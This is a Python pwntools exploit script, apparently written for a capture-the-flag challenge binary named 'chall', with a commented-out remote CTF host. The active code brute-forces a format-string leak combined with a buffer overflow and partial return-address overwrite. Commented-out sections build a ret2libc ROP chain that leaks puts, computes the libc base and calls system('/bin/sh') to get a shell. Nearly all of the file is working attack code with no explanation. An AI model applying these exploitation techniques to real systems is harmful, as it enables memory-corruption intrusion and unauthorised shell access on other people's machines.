from pwn import *
from pprint import pprint

offset = 265


format_string_offset = 4
base_string = b"ABCD"
format_string = bytes(f".%{format_string_offset}$lx".encode())
format_string += b".%x" * 50





while True :
    elf = ELF("./chall")
    libc = ELF("libc6_2.35-0ubuntu3.4_amd64.so")
    # libc.address = puts - libc.symbols["puts"]
    # print("chooooopi",libc.symbols['puts'])
    p = elf.process()
    # p = remote("ce441-pwn2.pwni.top",1337)
    context.arch = 'amd64'

    first_string = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9AXyAb1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1A\x91\x92\x93\x94\x95\x96\x97\x98\x99\x20\xa0"





    ################  DEBUG TOOLS #####################

    context.terminal = ['tmux','splitw', '-h']


    # print("shigga --->",elf.symbols['text'])
    ##################################################

    # libbb = elf.symbols['libc']

    # first_line = p.recvuntil("\n")
    # print("first line : ---->",first_line)

    # main_address = first_line.decode().split(" ")[7].strip()
    # hex_addr = int(main_address,16)
    # elf.address = hex_addr - elf.symbols['main']

    # rop = ROP(elf)
    # rop.call(elf.symbols["puts"],[elf.got['puts']])
    # rop.call(elf.symbols["vuln"])



    #print("stoort --------->",hex_addr)
    # pprint(elf.symbols)
    # p.recvuntil("\n")
    p.recvuntil("\n")
    p.sendline(b"1")
    # 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111AAAAAAAAAAA
    payload = [
        base_string,
        format_string     
    ]
    # print("len------>",len(payload[1]))
    payload.append(b"\x00")
    if (255-(len(payload[0])+len(payload[1]))) < 0 :
        exit
    payload.append(b"A"*(255-(len(payload[0])+len(payload[1]))))
    payload.append(b"\x20\xa0")
    # #print("---------------->",hex(elf.symbols['main']),hex(hex_addr))
    payload = b"".join(payload)
    p.send(payload)
    p.recvuntil("\n")
    p.recvuntil("\n")
    p.recvuntil("\n")
    p.recvuntil("\n")
    p.recvuntil("\n")
    p.recvuntil("\n")
    p.recvuntil("\n")
    p.recvuntil("\n")
    p.recvuntil("\n")

    try :
        p.sendline(b"66")
        ans = p.recvuntil("\n")
        # print("ans----------->",ans)
        # print("koops---------------->",ans.decode())
        if "ABC" in ans.decode() :
            print(ans.decode())
            print("434241" in ans.decode())
            break
    except Exception as e :
        print("nope")
    # p.recvuntil("\n")
    # print("tito",p.recvuntil("\n"))
    # puts = u64(p.recvuntil("\n").rstrip().ljust(8,b"\x00"))
    # log.info(f"puts found at {hex(puts)}")
    # # log.info(f"puts found at {hex(puts)}")

    # libc = ELF("libc6_2.35-0ubuntu3.4_amd64.so")
    # libc.address = puts - libc.symbols["puts"]
    # log.info(f"libc base address {hex(libc.address)}")
    # # print("-------------------------->",libc.symbols["puts"])

    # bin_sh = next(libc.search(b"/bin/sh\x00"))

    # # print("jamalllllll",hex(bin_sh))


    # rop = ROP(libc)
    # rop.call(libc.symbols["puts"],[next(libc.search(b"/bin/sh\x00"))])
    # # pprint(libc.symbols)
    # rop.call(libc.symbols["system"],[next(libc.search(b"/bin/sh\x00"))])
    # rop.call(libc.symbols["exit"])

    # # print("yipiii",p.recvuntil("\n"))
    # payload = [
    #     b"A"*offset,
    #     rop.chain()
    # ]
    # payload = b"".join(payload)
    # with open("payload","wb") as h:
    #     h.write(payload)

    # p.sendline(payload)
    # # print("zhito",p.recvuntil("\n"))

    # # pp = p.recvuntil("\n")
    # # log.info(pp)

    
# for offset in range(0,100) :
#     # p.recvuntil("\n")
#     p.sendline(b"1")
#     format_string = bytes(f".%{offset}$lx".encode())
#     format_string += b".%x" * 50
#     payload = [
#         base_string,
#         format_string     
#     ]
#     # print("len------>",len(payload[1]))
#     payload.append(b"\x00")
#     if (255-(len(payload[0])+len(payload[1]))) < 0 :
#         exit
#     payload.append(b"A"*(255-(len(payload[0])+len(payload[1]))))
#     payload.append(b"\x20\xa0")
#     # #print("---------------->",hex(elf.symbols['main']),hex(hex_addr))
#     payload = b"".join(payload)
#     p.send(payload)
#     p.recvuntil("\n")
#     p.recvuntil("\n")
#     p.recvuntil("\n")
#     p.recvuntil("\n")
#     p.recvuntil("\n")
#     p.recvuntil("\n")
#     p.sendline(b"66")
#     ans = p.recvuntil("\n")
#     if "434241" in ans.decode() :
#         print(offset)
#         break



gdb.attach( p, '''
    set disable-randomization off
    b show_error
'''
)


p.interactive()